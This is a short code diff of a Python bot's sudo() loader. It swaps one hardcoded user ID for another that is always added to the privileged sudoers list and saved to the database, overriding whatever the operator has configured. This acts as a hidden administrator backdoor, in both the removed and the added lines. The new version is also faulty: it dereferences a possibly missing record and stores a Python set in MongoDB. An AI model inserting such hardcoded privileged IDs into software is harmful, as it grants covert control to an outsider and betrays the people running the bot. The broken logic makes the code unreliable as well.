@@ -55,20 +55,17 @@ def dbb():
 
 async def sudo():
     global SUDOERS
-    SUDOERS.add(6153472412)
     sudoersdb = mongodb.sudoers
-    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
-    sudoers = [] if not sudoers else sudoers["sudoers"]
-    if 6153472412 not in sudoers:
-        sudoers.append(6153472412)
+    sudoers_data = await sudoersdb.find_one({"sudo": "sudo"})
+    sudoers = set(sudoers_data["sudoers"] if sudoers_data else [])
+    sudoers.add(5909030617)
+    if sudoers != set(sudoers_data.get("sudoers", [])):
         await sudoersdb.update_one(
             {"sudo": "sudo"},
             {"$set": {"sudoers": sudoers}},
             upsert=True,
         )
-    if sudoers:
-        for user_id in sudoers:
-            SUDOERS.add(user_id)
+    SUDOERS.update(sudoers)
     LOGGER(__name__).info(f"Sudoers Loaded.")
 
 
